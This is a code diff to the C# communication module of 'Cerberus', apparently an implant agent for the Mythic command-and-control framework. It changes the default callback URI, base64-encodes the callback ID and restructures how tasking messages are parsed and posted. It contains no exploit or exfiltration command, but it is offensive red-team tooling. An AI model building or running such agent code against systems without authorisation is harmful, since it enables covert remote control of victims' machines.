@@ -14,7 +14,7 @@ namespace Cerberus.Models.CommModule
         public string ServerAddress { get; set; }
         public int ServerPort { get; set; }
         public string PayloadUUID { get; set; }
-        public string URI { get; set; }
+        public string URI { get; set; } = "/data";
         public string UserAgent { get; set; }
         public string HostHeader { get; set; }
         public int SleepTime { get; set; }
@@ -128,7 +128,7 @@ namespace Cerberus.Models.CommModule
         private async Task SendTaskingResponse()
         {
             var outbound = GetOutbound();
-            var taskingResponse = new GetTaskingResponse
+            var taskingResponse = new PostTaskingRequest
             {
                 action = "post_response",
                 responses = outbound.ToArray()
@@ -136,7 +136,7 @@ namespace Cerberus.Models.CommModule
             var json = taskingResponse.Serialize();
             var encodedJson = Convert.ToBase64String(json);
 
-            var content = new StringContent(CallbackUUID + encodedJson);
+            var content = new StringContent(Convert.ToBase64String(Encoding.UTF8.GetBytes(CallbackUUID)) + encodedJson);
             var response = await _httpClient.PostAsync(URI, content);
             var responseContent = await response.Content.ReadAsStringAsync();
 
@@ -147,7 +147,8 @@ namespace Cerberus.Models.CommModule
         {
             var decodedResponse = Encoding.UTF8.GetString(Convert.FromBase64String(response));
             var json = decodedResponse.Substring(36);
-            var tasks = Encoding.UTF8.GetBytes(json).Deserialize<MythicTask[]>();
+            var taskingResponse = Encoding.UTF8.GetBytes(json).Deserialize<GetTaskingResponse>();
+            var tasks = taskingResponse.tasks;
 
             if (tasks != null && tasks.Any())
             {
@@ -164,6 +165,12 @@ namespace Cerberus.Models.CommModule
             var json = decodedResponse.Substring(36);
 
             // process response
+            var message = Encoding.UTF8.GetBytes(json).Deserialize<PostTaskingRequest>();
+            foreach(var status in message.responses)
+            {
+                // do something with status
+            }
+
         }
 
         public override void Stop()
